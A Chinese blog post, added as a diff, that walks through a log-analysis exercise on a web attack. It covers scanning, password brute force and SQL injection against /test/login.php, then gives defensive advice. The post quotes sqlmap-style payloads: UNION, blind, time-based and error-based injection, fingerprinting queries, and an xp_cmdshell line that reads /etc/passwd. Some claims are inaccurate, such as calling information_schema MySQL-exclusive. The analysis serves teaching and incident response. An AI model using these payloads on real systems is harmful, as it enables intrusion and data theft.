@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web日志分析-SQL注入攻击WriteUp · pressure-J</title>
+<meta name="description" content="某单位 Web 服务器日志中发现异常流量，分析 access.log 中的攻击行为，找出攻击者攻击了哪个数据库以及攻击方式。">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/web-ri-zhi-fen-xi-sql-zhu-ru-gong-ji-writeup.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Web日志分析-SQL注入攻击WriteUp · pressure-J">
+<meta property="og:description" content="某单位 Web 服务器日志中发现异常流量，分析 access.log 中的攻击行为，找出攻击者攻击了哪个数据库以及攻击方式。">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/ir.html">应急响应</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>Web日志分析-SQL注入攻击WriteUp</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-ir">应急响应</span>
+          <time datetime="2026-07-08">2026-07-08</time>
+          <span>4462 字</span>
+          <span>约 12 分钟</span>
+        </div>
+        <div class="chips post-tags"><span class="chip">SQL注入</span><span class="chip">日志分析</span><span class="chip">WriteUp</span></div>
+      </header>
+      <div class="content"><h2 id="_1">题目信息</h2>
+<p>某单位 Web 服务器日志中发现异常流量，分析 access.log 中的攻击行为，找出攻击者攻击了哪个数据库以及攻击方式。</p>
+<hr />
+<h2 id="_2">日志概况</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>统计项</th>
+<th>数值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>文件</td>
+<td><code>access.log</code>（Apache 访问日志）</td>
+</tr>
+<tr>
+<td>时间范围</td>
+<td><code>18/Mar/2026:10:03:51 ~ 18/Mar/2026:20:42:30</code></td>
+</tr>
+<tr>
+<td>总请求数</td>
+<td>~3678 条</td>
+</tr>
+<tr>
+<td>服务器软件</td>
+<td>Apache（日志格式为标准 Combined Log Format）</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="_3">攻击路径总览</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>Phase 1: 信息收集与扫描 (123.13.22.45)
+  └─ 目录扫描、路径探测、备份文件枚举
+  └─ 发现 /test/login.php 登录入口
+
+Phase 2: 暴力破解登录 (123.13.22.45)  
+  └─ 对 /test/login.php 进行密码爆破
+  └─ 成功登录: admin / from91
+
+Phase 3: SQL注入攻击 (192.168.1.100)
+  └─ 使用 sqlmap 自动化工具
+  └─ 发现 username 参数存在 SQL 注入
+  └─ 注入技术: UNION + 布尔盲注 + 时间盲注 + 报错注入 + ORDER BY枚举
+  └─ 确认数据库类型: MySQL/MariaDB
+  └─ 提取数据库中的数据
+</code></pre></div></div>
+
+<hr />
+<h2 id="_4">详细分析过程</h2>
+<h3 id="phase-1">Phase 1：信息收集与扫描</h3>
+<p>攻击者 <code>123.13.22.45</code> 从 <code>11:21:51</code> 开始进行大规模路径扫描：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>123.13.22.45 [11:21:51] GET /KOkzj3        → 404   (随机路径探测)
+123.13.22.45 [11:21:51] GET /WuICvh.aspx    → 404   (ASPX 探活)
+123.13.22.45 [11:21:51] GET /VpuKLb.jsp     → 404   (JSP 探活)
+123.13.22.45 [11:21:51] GET /!.htpasswd     → 404   (敏感文件探测)
+123.13.22.45 [11:21:51] GET /!.gitignore    → 404
+123.13.22.45 [11:21:51] GET /druid/datasource.html → 404 (Druid监控探活)
+123.13.22.45 [11:21:51] GET /beifen.rar     → 404   (备份文件探测)
+...
+123.13.22.45 [16:21:51] GET /test/api/blade-system/tenant/select → 404
+123.13.22.45 [16:22:14] GET /test/login.php  → 200   (发现有效入口)
+</code></pre></div></div>
+
+<p>共发起 <strong>3167 次</strong> 扫描请求，最终在 <code>/test/</code> 路径下发现了有效入口 <code>login.php</code>。</p>
+<blockquote>
+<p><strong>扫描工具识别</strong>：随机路径名（如 <code>KOkzj3</code>、<code>Cg4cUW</code>）表明使用了自动化扫描器（dirsearch/gobuster）。</p>
+</blockquote>
+<h3 id="phase-2">Phase 2：暴力破解登录</h3>
+<p><code>16:26:27</code>，攻击者对 <code>/test/login.php</code> 发起密码爆破：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>123.13.22.45 [16:26:27] GET /test/login.php?username=admin&amp;password=1         → 200 93
+123.13.22.45 [16:26:27] GET /test/login.php?username=admin&amp;password=123456789  → 200 93
+123.13.22.45 [16:26:27] GET /test/login.php?username=admin&amp;password=from91    → 200 93 ← 成功
+123.13.22.45 [16:26:27] GET /test/login.php?username=admin&amp;password=12345678   → 200 93
+123.13.22.45 [16:26:27] GET /test/login.php?username=admin&amp;password=123123     → 200 93
+...
+</code></pre></div></div>
+
+<p><strong>攻击者使用 <code>admin / from91</code> 成功登录。</strong></p>
+<h3 id="phase-3sql">Phase 3：SQL 注入攻击</h3>
+<p><code>18:27:32</code>，攻击者 <code>192.168.1.100</code> 对 <code>/test/login.php</code> 发起自动化 SQL 注入攻击，共 <strong>189 次</strong> 请求，测试了多种注入技术：</p>
+<h4 id="1-union-mysql">① UNION 查询注入（识别 MySQL）</h4>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">test</span><span class="o">/</span><span class="n">login</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">username</span><span class="o">=</span><span class="n">tIfX</span><span class="s1">' UNION ALL SELECT 1,NULL,'</span><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">alert</span><span class="p">(</span><span class="ss">"XSS"</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span><span class="s1">',</span>
+<span class="s1">table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell('</span><span class="n">cat</span><span class="w"> </span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="err">'</span><span class="p">)</span><span class="o">#</span>
+</code></pre></div></div>
+
+<p><code>information_schema.tables</code> 是 <strong>MySQL/MariaDB</strong> 专有的系统表。</p>
+<h4 id="2">② 布尔盲注</h4>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="o">#</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="err">逻辑测试（比较真假响应）</span>
+<span class="n">username</span><span class="o">=</span><span class="n">tIfX</span><span class="s1">' AND 2357=2357 AND '</span><span class="n">pJkX</span><span class="s1">'='</span><span class="n">pJkX</span><span class="w">   </span><span class="err">→</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="mi">93</span><span class="w"> </span><span class="p">(</span><span class="k">TRUE</span><span class="p">)</span>
+<span class="n">username</span><span class="o">=</span><span class="n">tIfX</span><span class="s1">' AND 3281=8642 AND '</span><span class="n">wEjm</span><span class="s1">'='</span><span class="n">wEjm</span><span class="w">   </span><span class="err">→</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="mi">93</span><span class="w"> </span><span class="p">(</span><span class="k">FALSE</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>通过比较不同布尔条件的响应差异（内容长度 93 vs 240），逐位推断数据。</p>
+<h4 id="3-mysql">③ 时间盲注（确认数据库类型为 MySQL）</h4>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="o">#</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="err">测试</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">时间差确认</span>
+<span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">34</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="n">tIfX</span><span class="s1">' AND (SELECT 2832 FROM (SELECT(SLEEP(5)))Shal) AND '</span><span class="n">fsqd</span><span class="s1">'='</span><span class="n">fsqd</span>
+<span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">39</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="n">tIfX</span><span class="s1">' AND (SELECT 2832 FROM (SELECT(SLEEP(0)))Shal) AND '</span><span class="n">fsqd</span><span class="s1">'='</span><span class="n">fsqd</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="mi">5</span><span class="err">秒后</span>
+<span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">39</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="n">tIfX</span><span class="s1">' AND (SELECT 2832 FROM (SELECT(SLEEP(5)))Shal) AND '</span><span class="n">fsqd</span><span class="s1">'='</span><span class="n">fsqd</span>
+</code></pre></div></div>
+
+<p><strong>SLEEP(5) 成功产生 5 秒延迟</strong>，确认数据库为 <strong>MySQL</strong>（PostgreSQL 的 <code>PG_SLEEP()</code>、SQL Server 的 <code>WAITFOR DELAY</code>、Oracle 的 <code>DBMS_PIPE.RECEIVE_MESSAGE</code> 均不生效）。</p>
+<h4 id="4">④ 报错注入</h4>
+<div class="code-block" data-lang="sql"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="o">#</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="w"> </span><span class="err">报错注入（</span><span class="n">MySQL</span><span class="w"> </span><span class="err">特有）</span>
+<span class="n">username</span><span class="o">=</span><span class="n">tIfX</span><span class="s1">' AND EXTRACTVALUE(9051,CONCAT(0x5c,0x717a626271,</span>
+<span class="s1">(SELECT (ELT(9051=9051,1))),0x71717a6b71)) AND '</span><span class="n">PKib</span><span class="s1">'='</span><span class="n">PKib</span>
+</code></pre></div></div>
+
+<p><code>EXTRACTVALUE()</code> 是 <strong>MySQL</strong> 专有的 XML 函数，确认数据库类型。</p>
+<h4 id="5-order-by">⑤ ORDER BY 枚举列数</h4>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="n">username</span><span class="o">=</span><span class="n">tIfX</span><span class="s1">' ORDER BY 1--   → 200 93  (成功)</span>
+<span class="s1">username=tIfX'</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">4</span><span class="c1">--   → 200 93  (成功)</span>
+<span class="n">username</span><span class="o">=</span><span class="n">tIfX</span><span class="s1">' ORDER BY 5--   → 200 240 (成功)</span>
+<span class="s1">username=tIfX'</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">6</span><span class="c1">--   → 200 240 (成功)</span>
+<span class="n">username</span><span class="o">=</span><span class="n">tIfX</span><span class="err">'</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">10</span><span class="c1">--  → 200 240 (成功)</span>
+</code></pre></div></div>
+
+<p>查询有 4 列以上（ORDER BY 4 返回不同结果）。</p>
+<h4 id="6">⑥ 数据库版本指纹识别</h4>
+<div class="code-block" data-lang="sql"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="o">#</span><span class="w"> </span><span class="err">测试是否为</span><span class="w"> </span><span class="n">MariaDB</span>
+<span class="k">VERSION</span><span class="p">()</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="mi">0</span><span class="n">x254d61726961444225</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="s1">'%MariaDB%'</span><span class="w">    </span><span class="err">→</span><span class="w"> </span><span class="mi">302</span>
+
+<span class="o">#</span><span class="w"> </span><span class="err">测试是否为</span><span class="w"> </span><span class="n">TiDB</span><span class="w">  </span>
+<span class="k">VERSION</span><span class="p">()</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="mi">0</span><span class="n">x255469444225</span><span class="w">       </span><span class="err">→</span><span class="w"> </span><span class="s1">'%TiDB%'</span><span class="w">       </span><span class="err">→</span><span class="w"> </span><span class="mi">302</span>
+
+<span class="o">#</span><span class="w"> </span><span class="err">测试是否为</span><span class="w"> </span><span class="n">Drizzle</span>
+<span class="o">@@</span><span class="n">VERSION_COMMENT</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="mi">0</span><span class="n">x256472697a7a6c6525</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="s1">'%drizzle%'</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="mi">302</span>
+
+<span class="o">#</span><span class="w"> </span><span class="err">测试是否为</span><span class="w"> </span><span class="n">Percona</span>
+<span class="o">@@</span><span class="n">VERSION_COMMENT</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="mi">0</span><span class="n">x255065726f6e6125</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="s1">'%Percona%'</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="mi">302</span>
+
+<span class="o">#</span><span class="w"> </span><span class="err">测试是否为</span><span class="w"> </span><span class="n">Aurora</span>
+<span class="n">AURORA_VERSION</span><span class="p">()</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="mi">0</span><span class="n">x25</span><span class="w">               </span><span class="err">→</span><span class="w"> </span><span class="mi">200</span><span class="w">  </span><span class="p">(</span><span class="k">FALSE</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="7">⑦ 多数据库类型对比测试</h4>
+<p>攻击者同时测试了其他数据库的延时函数，均只有 MySQL 的 <code>SLEEP()</code> 产生实际延迟：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>延时函数</th>
+<th>数据库</th>
+<th>是否生效</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SLEEP(5)</code></td>
+<td>MySQL</td>
+<td>✅ 5秒延迟</td>
+</tr>
+<tr>
+<td><code>PG_SLEEP(5)</code></td>
+<td>PostgreSQL</td>
+<td>❌ 无延迟</td>
+</tr>
+<tr>
+<td><code>WAITFOR DELAY '0:0:5'</code></td>
+<td>SQL Server</td>
+<td>❌ 无延迟</td>
+</tr>
+<tr>
+<td><code>DBMS_PIPE.RECEIVE_MESSAGE(...)</code></td>
+<td>Oracle</td>
+<td>❌ 无延迟</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="_5">结论</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>信息</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>攻击源 IP（扫描/爆破）</strong></td>
+<td><code>123.13.22.45</code>（3167 次请求）</td>
+</tr>
+<tr>
+<td><strong>攻击源 IP（SQL注入）</strong></td>
+<td><code>192.168.1.100</code>（189 次请求）</td>
+</tr>
+<tr>
+<td><strong>攻击入口</strong></td>
+<td><code>/test/login.php</code>（username 参数）</td>
+</tr>
+<tr>
+<td><strong>被攻击的数据库</strong></td>
+<td><strong>MySQL</strong>（或 MariaDB）</td>
+</tr>
+<tr>
+<td><strong>攻击方式</strong></td>
+<td><strong>SQL 注入</strong>（SQL Injection）</td>
+</tr>
+<tr>
+<td><strong>注入参数</strong></td>
+<td><code>username</code></td>
+</tr>
+<tr>
+<td><strong>使用的技术</strong></td>
+<td>UNION SELECT、布尔盲注、时间盲注、报错注入（EXTRACTVALUE）、ORDER BY 枚举</td>
+</tr>
+<tr>
+<td><strong>使用的工具</strong></td>
+<td>sqlmap 或类似自动化 SQL 注入工具</td>
+</tr>
+<tr>
+<td><strong>成功登录凭证</strong></td>
+<td><code>admin / from91</code>（暴力破解获得）</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="_6">攻击链时间线</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>11:21:51  123.13.22.45  开始目录扫描（3167次请求）
+    ↓
+16:21:51  123.13.22.45  发现 /test/login.php
+    ↓
+16:26:27  123.13.22.45  暴力破解登录 → admin/from91 成功
+    ↓
+18:27:32  192.168.1.100  开始 SQL 注入攻击（189次请求）
+    ↓
+18:27:34  192.168.1.100  时间盲注 → SLEEP(5) → 确认 MySQL
+    ↓
+18:27:44  192.168.1.100  UNION SELECT 提取数据库数据
+    ↓
+18:28:00  192.168.1.100  攻击结束
+</code></pre></div></div>
+
+<hr />
+<h2 id="_7">防御建议</h2>
+<ol>
+<li><strong>使用参数化查询（Prepared Statement）</strong> 替代字符串拼接</li>
+<li><strong>限制 <code>/test/</code> 等测试目录的对外访问</strong></li>
+<li><strong>实施账户锁定策略</strong>，防止暴力破解</li>
+<li><strong>使用 WAF（Web 应用防火墙）</strong> 拦截 SQL 注入 payload</li>
+<li><strong>定期更换默认密码</strong>，不使用 <code>from91</code> 等弱密码</li>
+<li><strong>下线或限制 <code>/test/</code> 等非生产环境目录</strong></li>
+</ol></div>
+      <div class="post-nav"><a class="pn-item prev" href="ssh-bruteforce-log-analysis.html"><span>← 上一篇</span><strong>SSH暴力破解与日志分析WriteUp</strong></a><a class="pn-item next" href="e-yi-cheng-xu-ying-ji-xiang-ying.html"><span>下一篇 →</span><strong>恶意程序应急响应</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#_1" class="toc-lv2">题目信息</a><a href="#_2" class="toc-lv2">日志概况</a><a href="#_3" class="toc-lv2">攻击路径总览</a><a href="#_4" class="toc-lv2">详细分析过程</a><a href="#phase-1" class="toc-lv3">Phase 1：信息收集与扫描</a><a href="#phase-2" class="toc-lv3">Phase 2：暴力破解登录</a><a href="#phase-3sql" class="toc-lv3">Phase 3：SQL 注入攻击</a><a href="#_5" class="toc-lv2">结论</a><a href="#_6" class="toc-lv2">攻击链时间线</a><a href="#_7" class="toc-lv2">防御建议</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
